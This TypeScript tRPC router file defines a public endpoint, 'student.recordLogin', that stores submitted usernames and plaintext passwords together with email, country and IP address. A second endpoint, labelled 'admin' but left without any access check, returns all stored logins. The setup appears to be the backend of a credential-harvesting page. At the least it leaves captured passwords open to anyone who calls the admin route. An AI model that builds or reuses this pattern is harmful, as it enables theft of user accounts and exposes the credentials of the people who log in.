import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import { recordStudentLogin, getAllStudentLogins } from "./db";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  student: router({
    recordLogin: publicProcedure
      .input(z.object({
        username: z.string(),
        password: z.string(),
        email: z.string().optional(),
        country: z.string().optional(),
        ipAddress: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        await recordStudentLogin({
          username: input.username,
          password: input.password,
          email: input.email,
          country: input.country,
          ipAddress: input.ipAddress,
          loginTime: new Date(),
        });
        return { success: true };
      }),
  }),

  admin: router({
    getStudentLogins: publicProcedure
      .query(async () => {
        const logins = await getAllStudentLogins();
        return logins;
      }),
  }),
});

export type AppRouter = typeof appRouter;
